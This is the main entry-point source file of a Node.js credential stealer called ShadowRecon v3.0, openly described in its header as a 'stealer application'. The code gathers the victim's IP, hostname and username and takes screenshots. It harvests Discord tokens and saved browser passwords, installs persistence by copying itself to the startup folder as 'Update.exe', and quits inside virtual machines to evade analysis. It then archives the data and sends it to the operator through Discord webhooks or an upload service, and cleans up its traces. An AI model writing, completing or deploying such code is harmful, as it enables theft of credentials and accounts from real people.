/**
 * Main Application Entry Point
 * Clean, modular, and efficient stealer application
 */

const { logger } = require('./core/logger');
const { ErrorHandler } = require('./core/errors');
const config = require('./config/config');
const { fileManager } = require('./core/fileManager');
const { stats } = require('./core/statistics');
const { BrowserCollector } = require('./modules/browsers/collector');
const { DiscordService } = require('./services/discord/service');
const { uploadService } = require('./services/upload/service');
const ScreenshotCapture = require('./modules/screenshot/capture');
const CoreUtils = require('./core/utils');

class Application {
    constructor() {
        this.initialized = false;
        this.results = {};
        this.screenshots = [];
        
        // Initialize services
        this.browserCollector = new BrowserCollector();
        this.discordService = new DiscordService();
        this.screenshotCapture = new ScreenshotCapture();
        
        // Setup error handlers
        ErrorHandler.setupGlobalHandlers();
    }

    /**
     * Initialize application
     */
    async initialize() {
        try {
            logger.info('Initializing ShadowRecon v3.0');

            // Validate configuration
            if (!config.validate()) {
                throw new Error('Invalid configuration');
            }

            // Note: File manager initialization moved to processAndSend to avoid creating 
            // temporary folders when no Discord tokens are found

            // Collect system information
            await this.collectSystemInfo();

            // Capture initial screenshot when launching
            await this.captureInitialScreenshot();

            // Setup persistence if enabled
            await this.setupPersistence();

            this.initialized = true;
            logger.info('Application initialized successfully');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Collect system information
     */
    async collectSystemInfo() {
        try {
            const systemInfo = {
                ip: await CoreUtils.getPublicIp(),
                hostname: await CoreUtils.getHostname(),
                username: CoreUtils.getUsername(),
                platform: process.platform,
                arch: process.arch,
                nodeVersion: process.version
            };

            stats.setSystemInfo(systemInfo);
            logger.info('System information collected', systemInfo);
        } catch (error) {
            logger.error('Failed to collect system information', error.message);
        }
    }

    /**
     * Setup persistence mechanism
     */
    async setupPersistence() {
        try {
            if (!config.get('security.enableSelfDestruct', false)) {
                return;
            }

            const startupPath = config.get('paths.startup');
            const currentExe = process.argv0;
            const targetPath = require('path').join(startupPath, 'Update.exe');

            if (require('fs').existsSync(currentExe)) {
                require('fs').copyFileSync(currentExe, targetPath);
                logger.debug('Persistence setup completed', { target: targetPath });
            }
        } catch (error) {
            logger.debug('Persistence setup failed', error.message);
        }
    }

    /**
     * Capture initial screenshot when application starts
     */
    async captureInitialScreenshot() {
        try {
            const modules = config.get('modules.enabled');
            if (!modules.screenshot) {
                logger.debug('Screenshot module disabled');
                return;
            }

            logger.info('Capturing initial screenshot');
            
            // Set output directory to temp for now (will be moved to proper location later)
            const tempDir = require('path').join(require('os').tmpdir(), 'shadowrecon_screenshots');
            this.screenshotCapture.setOutputDirectory(tempDir);

            // Take initial screenshot
            const screenshotPath = await this.screenshotCapture.takeScreenshot();
            if (screenshotPath) {
                this.screenshots.push(screenshotPath);
                logger.info('Initial screenshot captured successfully', { path: screenshotPath });
            } else {
                logger.warn('Failed to capture initial screenshot');
            }
        } catch (error) {
            logger.error('Error capturing initial screenshot', error.message);
        }
    }

    /**
     * Run data collection modules
     */
    async collectData() {
        if (!this.initialized) {
            await this.initialize();
        }

        logger.info('Starting data collection');

        const modules = config.get('modules.enabled');
        const results = {};

        // Discord data collection - check first if Discord tokens exist
        if (modules.discord) {
            try {
                logger.info('Collecting Discord data');
                results.discord = await this.discordService.collectAccounts();
                
                // Exit early if no Discord accounts found
                const discordAccounts = results.discord?.length || 0;
                if (discordAccounts === 0) {
                    logger.info('No Discord tokens found - checking if screenshots should still be processed');
                    
                    // If we have screenshots captured, still create archive with screenshots only
                    if (this.screenshots.length > 0) {
                        logger.info(`Found ${this.screenshots.length} screenshots - creating archive with screenshots only`);
                        return { screenshots: this.screenshots.length }; // Return special result to indicate screenshots should be processed
                    }
                    
                    logger.info('No Discord tokens found and no screenshots - exiting without creating files');
                    return null; // Return null to indicate no data should be processed
                }
                
                logger.info(`Found ${discordAccounts} Discord accounts - proceeding with data collection`);
            } catch (error) {
                ErrorHandler.handle(error);
                
                // If we have screenshots captured, still create archive with screenshots only
                if (this.screenshots.length > 0) {
                    logger.info(`Discord data collection failed but found ${this.screenshots.length} screenshots - creating archive with screenshots only`);
                    return { screenshots: this.screenshots.length }; // Return special result to indicate screenshots should be processed
                }
                
                logger.info('Discord data collection failed and no screenshots - exiting without creating files');
                return null; // Return null to indicate no data should be processed
            }
        } else {
            // If Discord module is disabled, check if we have screenshots
            if (this.screenshots.length > 0) {
                logger.info(`Discord module disabled but found ${this.screenshots.length} screenshots - creating archive with screenshots only`);
                return { screenshots: this.screenshots.length }; // Return special result to indicate screenshots should be processed
            }
            
            logger.info('Discord module disabled and no screenshots - exiting without creating files');
            return null; // If Discord module is disabled and no screenshots, don't create any files
        }

        // Browser data collection - only if we have Discord tokens
        if (modules.browsers) {
            try {
                logger.info('Collecting browser data');
                results.browsers = await this.browserCollector.collect();
            } catch (error) {
                ErrorHandler.handle(error);
                results.browsers = { error: error.message };
            }
        }

        // Add other modules here as needed
        // if (modules.crypto) { ... }
        // if (modules.files) { ... }
        // if (modules.system) { ... }

        this.results = results;
        
        logger.info('Data collection completed', {
            modules: Object.keys(results),
            browserAccounts: results.browsers?.totalPasswords || 0,
            discordAccounts: results.discord?.length || 0
        });

        return results;
    }

    /**
     * Process and send collected data
     */
    async processAndSend() {
        try {
            logger.info('Processing collected data');

            // Initialize file manager now that we know we have Discord tokens to process
            fileManager.init();

            // Save screenshots to the archive
            await this.saveScreenshots();

            // Create archive
            const zipPath = await fileManager.createZip();
            const zipSizeMB = fileManager.getZipSizeMB();

            logger.info('Archive created', {
                path: zipPath,
                size: `${zipSizeMB.toFixed(2)} MB`
            });

            // Determine if file should be uploaded
            let downloadLink = '';
            if (uploadService.shouldUpload(zipPath)) {
                logger.info('File size exceeds limit, uploading to external service');
                downloadLink = await uploadService.upload(zipPath);
            }

            // Send Discord accounts if available (more complete embed with username, etc.)
            if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
                const systemInfo = stats.getRawData().system;
                await this.discordService.sendAccountEmbeds(this.results.discord, systemInfo.ip || 'Unknown');
                logger.info('Sent Discord account embeds (most complete information)');
            } else {
                // Only send main webhook if no Discord accounts are available
                await this.sendMainWebhook(downloadLink, zipPath);
                logger.info('Sent main webhook (no Discord accounts available)');
            }

            logger.info('Data processing and sending completed');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Save captured screenshots to the file manager
     */
    async saveScreenshots() {
        try {
            if (this.screenshots.length === 0) {
                logger.debug('No screenshots to save');
                return;
            }

            logger.info(`Saving ${this.screenshots.length} screenshots to archive`);

            for (let i = 0; i < this.screenshots.length; i++) {
                const screenshotPath = this.screenshots[i];
                const fileName = `screenshot_${i + 1}_${require('path').basename(screenshotPath)}`;
                
                if (fileManager.saveSingle(screenshotPath, 'Screenshots', fileName)) {
                    logger.debug(`Screenshot saved to archive: ${fileName}`);
                } else {
                    logger.warn(`Failed to save screenshot: ${screenshotPath}`);
                }
            }

            logger.info('Screenshots saved to archive successfully');
        } catch (error) {
            logger.error('Error saving screenshots', error.message);
        }
    }

    /**
     * Send main webhook with statistics
     */
    async sendMainWebhook(downloadLink = '', zipPath = '') {
        try {
            const systemInfo = stats.getRawData().system;
            const payload = stats.buildWebhookPayload(
                systemInfo.username,
                systemInfo.hostname,
                systemInfo.ip,
                downloadLink
            );

            if (downloadLink) {
                // Send with link only
                await this.discordService.sendWebhook(JSON.parse(payload));
            } else {
                // Send with file attachment
                const embed = JSON.parse(payload).embeds[0];
                await this.discordService.sendFile(zipPath, embed);
            }

            logger.info('Main webhook sent successfully');
        } catch (error) {
            logger.error('Failed to send main webhook', error.message);
        }
    }

    /**
     * Cleanup resources
     */
    async cleanup() {
        try {
            logger.info('Cleaning up resources');

            // Clean up temporary files
            fileManager.cleanup();

            // Clean up screenshot temporary files
            await this.cleanupScreenshots();

            logger.info('Cleanup completed');
        } catch (error) {
            logger.error('Cleanup failed', error.message);
        }
    }

    /**
     * Clean up screenshot temporary files
     */
    async cleanupScreenshots() {
        try {
            for (const screenshotPath of this.screenshots) {
                if (require('fs').existsSync(screenshotPath)) {
                    require('fs').unlinkSync(screenshotPath);
                    logger.debug(`Cleaned up screenshot: ${screenshotPath}`);
                }
            }

            // Clean up temporary screenshot directory if it exists
            const tempDir = require('path').join(require('os').tmpdir(), 'shadowrecon_screenshots');
            if (require('fs').existsSync(tempDir)) {
                require('fs').rmSync(tempDir, { recursive: true, force: true });
                logger.debug(`Cleaned up screenshot temp directory: ${tempDir}`);
            }
        } catch (error) {
            logger.debug('Screenshot cleanup failed', error.message);
        }
    }

    /**
     * Run complete application workflow
     */
    async run() {
        try {
            logger.info('Starting ShadowRecon v3.0');

            // Initialize application
            await this.initialize();

            // VM detection (if enabled)
            if (config.get('security.enableVmDetection')) {
                const isVm = await CoreUtils.isVirtualMachine();
                if (isVm) {
                    logger.warn('Virtual machine detected, exiting');
                    return;
                }
            }

            // Collect data
            const results = await this.collectData();
            
            // Exit early if no data was collected (results will be null)
            if (results === null) {
                logger.info('ShadowRecon completed - no data collected, no files created');
                return;
            }

            // Check if we have only screenshots (special case)
            if (results.screenshots && Object.keys(results).length === 1) {
                logger.info('Processing screenshots only (no Discord tokens found)');
                await this.processScreenshotsOnly();
                logger.info('ShadowRecon completed - screenshots processed');
                return;
            }

            // Process and send data (normal case with Discord tokens)
            await this.processAndSend();

            logger.info('ShadowRecon completed successfully');
        } catch (error) {
            logger.error('Application failed', error.message);
            ErrorHandler.handle(error);
        } finally {
            // Always cleanup
            await this.cleanup();
        }
    }

    /**
     * Process screenshots only (when no Discord tokens are found)
     */
    async processScreenshotsOnly() {
        try {
            logger.info('Processing screenshots without other data');

            // Initialize file manager
            fileManager.init();

            // Save screenshots to the archive
            await this.saveScreenshots();

            // Create archive
            const zipPath = await fileManager.createZip();
            const zipSizeMB = fileManager.getZipSizeMB();

            logger.info('Screenshots archive created', {
                path: zipPath,
                size: `${zipSizeMB.toFixed(2)} MB`,
                screenshots: this.screenshots.length
            });

            // For testing purposes, we'll just log the creation
            // In a real scenario, this could still be sent via webhook
            logger.info('Screenshots archive ready for collection');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }
}

/**
 * Application entry point
 */
async function main() {
    const app = new Application();
    await app.run();
}

// Run application if this file is executed directly
if (require.main === module) {
    main().catch(error => {
        console.error('Unhandled error:', error);
        process.exit(1);
    });
}

module.exports = {
    Application,
    main
};